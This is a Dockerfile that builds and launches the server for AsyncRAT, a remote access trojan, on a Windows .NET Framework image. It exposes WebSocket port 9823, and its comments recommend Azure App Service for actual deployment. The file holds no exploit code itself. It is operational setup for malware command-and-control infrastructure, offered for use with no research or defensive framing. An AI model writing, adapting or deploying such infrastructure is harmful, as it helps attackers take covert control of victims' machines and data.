# Dockerfile for WebSocket RAT Server
# NOTE: This image builds for Windows-only .NET Framework 4.8
# Use Azure App Service for actual deployment (native Windows support)
# This Dockerfile is for reference only - Railway/Linux deployments won't work

FROM mcr.microsoft.com/dotnet/framework/sdk:4.8-windowsservercore-ltsc2022

WORKDIR /app

# Copy entire source
COPY . .

# Build the project
RUN dotnet build Server/Server.vbproj -c Release

# Expose the WebSocket port
EXPOSE 9823

# Run the server
ENTRYPOINT ["Server\\bin\\Release\\AsyncRAT.exe"]
